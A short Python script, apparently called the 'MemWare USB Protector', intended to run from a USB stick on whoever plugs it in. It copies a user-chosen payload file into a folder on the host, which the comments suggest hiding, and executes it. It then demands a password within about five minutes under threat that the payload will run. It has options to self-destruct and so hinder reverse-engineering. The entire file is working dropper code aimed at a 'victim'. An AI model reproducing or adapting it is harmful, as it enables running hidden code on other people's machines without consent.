import shutil
import os
import time

targetFolder = "targetfolder" # folder the payload will be stored in, you probably want it to be hidden
passwordStorage = "targetfolder" # path in where the password will be stored in, generally you can keep this in view of the victim/intruder
passwordFilename = "MemWare-password.txt" # File name for the password (keep the .txt)

payloadName = "payload.py" # name of the payload file that will be ran if the password isnt input in time (store in the USB disk)
selfdestruct = False # whether the payload file will self-destruct (from the USB) to try to block decoding (this will make the USB protector only work once)
                     # If you have good obfusaction (or the intruder doesn't know reverse-engineering), you should be fine leaving it in their hands
selfselfdestruct = False # same as previous, but will destroy the current file instead (after input)

trustedComputers = [""] # You can put your own computer name here so that the script doesnt affect you.

### Logic

if os.environ['COMPUTERNAME'] in trustedComputers: # You can use "print(os.environ['COMPUTERNAME])" to get your computer name
    print("Trusted computer detected, exiting.")
    exit()

with open(f"{passwordStorage}/{passwordFilename}", "w") as file:
    file.write("This is so that the read function doesnt fail!")

if not os.path.isfile(f"{targetFolder}/{payloadName}"): # The script has already executed
    if selfdestruct:
        shutil.move(payloadName, targetFolder) # Move the script 
    else:
        shutil.copy(payloadName, targetFolder) # Copy the script
else:
    exit()

os.startfile(f"{targetFolder}/{payloadName}") # Start the payload

print("You have triggered the MemWare USB Protector system. Please input the password for the usb in approximately 5 minutes, or the user set payload will execute on your machine.")
password = str(input("Please input the password >>> "))
print("The password has been sent to the payload, because it's not stored on this file, we don't know if the password is correct or not.")

with open(f"{passwordStorage}/{passwordFilename}", "w") as file:
    file.write(password) # Write the password to the password file

if selfselfdestruct:
    os.remove(__file__) # Self destruct

time.sleep(30)